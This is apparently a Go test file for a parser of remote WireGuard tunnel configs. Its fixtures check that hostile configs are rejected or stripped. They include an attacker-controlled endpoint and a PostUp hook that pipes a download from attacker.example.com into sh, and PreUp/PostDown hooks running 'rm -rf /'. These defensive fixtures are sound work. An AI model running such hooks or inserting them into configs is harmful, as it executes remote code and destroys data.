package remoteinput

import "testing"

const pyjamasSampleConfig = `
[Interface]
Address = 10.101.0.7/32
PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
PostUp = printf 'You can now access http://0.0.0.0:43127 on https://a1b2c3.tunnel.pyjam.as/ ✨\n'

[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 10.101.0.1/32
Endpoint = tunnel.pyjam.as:54321
PersistentKeepalive = 21
`

func TestParsePyjamasConfigReadsTheDocumentedShape(t *testing.T) {
	parsed, err := parsePyjamasConfig(pyjamasSampleConfig)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if parsed.address.String() != "10.101.0.7" {
		t.Fatalf("unexpected address %s", parsed.address)
	}
	if parsed.allowedIP.String() != "10.101.0.1/32" {
		t.Fatalf("unexpected allowed ip %s", parsed.allowedIP)
	}
	if parsed.endpointHost != "tunnel.pyjam.as" || parsed.endpointPort != 54321 {
		t.Fatalf("unexpected endpoint %s:%d", parsed.endpointHost, parsed.endpointPort)
	}
	if parsed.keepalive != 21 {
		t.Fatalf("unexpected keepalive %d", parsed.keepalive)
	}
	if parsed.public.String() != "https://a1b2c3.tunnel.pyjam.as" {
		t.Fatalf("unexpected public origin %s", parsed.public)
	}
	if len(parsed.privateKey) != 64 || len(parsed.peerPublicKey) != 64 {
		t.Fatalf("keys were not normalised to hex")
	}
}

// The remote document controls every byte the provider reads, so each field is
// rejected independently rather than trusted because the rest of the file
// looked well formed.
func TestParsePyjamasConfigRejectsHostileDocuments(t *testing.T) {
	tests := []struct{ name, config string }{
		{"routable address", `[Interface]
Address = 203.0.113.5/32
PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
PostUp = printf 'https://a1b2c3.tunnel.pyjam.as/'
[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 10.101.0.1/32
Endpoint = tunnel.pyjam.as:54321`},
		{"default route peer", `[Interface]
Address = 10.101.0.7/32
PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
PostUp = printf 'https://a1b2c3.tunnel.pyjam.as/'
[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 0.0.0.0/0
Endpoint = tunnel.pyjam.as:54321`},
		{"foreign endpoint", `[Interface]
Address = 10.101.0.7/32
PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
PostUp = printf 'https://a1b2c3.tunnel.pyjam.as/'
[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 10.101.0.1/32
Endpoint = attacker.example.com:54321`},
		{"foreign public origin", `[Interface]
Address = 10.101.0.7/32
PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
PostUp = printf 'https://a1b2c3.attacker.example.com/'
[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 10.101.0.1/32
Endpoint = tunnel.pyjam.as:54321`},
		{"malformed key", `[Interface]
Address = 10.101.0.7/32
PrivateKey = not-a-key
PostUp = printf 'https://a1b2c3.tunnel.pyjam.as/'
[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 10.101.0.1/32
Endpoint = tunnel.pyjam.as:54321`},
		{"missing public origin", `[Interface]
Address = 10.101.0.7/32
PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 10.101.0.1/32
Endpoint = tunnel.pyjam.as:54321`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if _, err := parsePyjamasConfig(test.config); err == nil {
				t.Fatalf("expected %s to be rejected", test.name)
			}
		})
	}
}

// wg-quick would execute these hooks as root shell strings chosen by the remote
// service. The parser keeps only the inert slug it reads out of PostUp.
func TestParsePyjamasConfigNeverRetainsScriptHooks(t *testing.T) {
	hostile := `[Interface]
Address = 10.101.0.7/32
PrivateKey = qHhTFJ7VvXKcZ6yUZ1sJm0bGx3vQwYt2pRnLkAeDcFo=
PostUp = curl https://attacker.example.com/x | sh; printf 'https://a1b2c3.tunnel.pyjam.as/'
PreUp = rm -rf /
PostDown = rm -rf /
Table = off
[Peer]
PublicKey = SJ9mXwq2rTuVbNc4EhYp7ZdKgLoIaFsD1QwErTyUiOk=
AllowedIPs = 10.101.0.1/32
Endpoint = tunnel.pyjam.as:54321`
	parsed, err := parsePyjamasConfig(hostile)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if parsed.public.String() != "https://a1b2c3.tunnel.pyjam.as" {
		t.Fatalf("unexpected public origin %s", parsed.public)
	}
}

func TestParsePyjamasConfigKeepsTheFirstDirective(t *testing.T) {
	shadowed := pyjamasSampleConfig + "\nAllowedIPs = 0.0.0.0/0\nEndpoint = attacker.example.com:1\n"
	parsed, err := parsePyjamasConfig(shadowed)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if parsed.allowedIP.String() != "10.101.0.1/32" || parsed.endpointHost != pyjamasHost {
		t.Fatalf("a trailing duplicate overrode a validated directive")
	}
}
